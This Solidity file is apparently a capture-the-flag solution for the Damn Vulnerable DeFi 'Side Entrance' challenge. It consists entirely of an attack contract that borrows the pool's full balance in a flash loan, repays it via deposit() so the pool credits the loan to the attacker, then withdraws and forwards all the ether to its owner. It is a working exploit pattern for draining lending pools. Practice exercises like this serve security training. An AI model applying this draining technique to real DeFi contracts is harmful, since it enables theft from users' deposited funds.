// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackSideEntrance is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool private pool;
    address public owner;

    constructor(SideEntranceLenderPool poolAddress) {
        pool = poolAddress;
        owner = msg.sender;
    }

    // Function called by the pool during flash loan
    function execute() external payable override {
        require(msg.sender == address(pool), "Sender must be lending pool");

        // 還債，且更改 ETH owner
        pool.deposit{value: address(this).balance}();
    }

    function attack() public payable {
        require(msg.sender == owner, "Sender must be owner");

        pool.flashLoan(address(pool).balance);

        pool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}
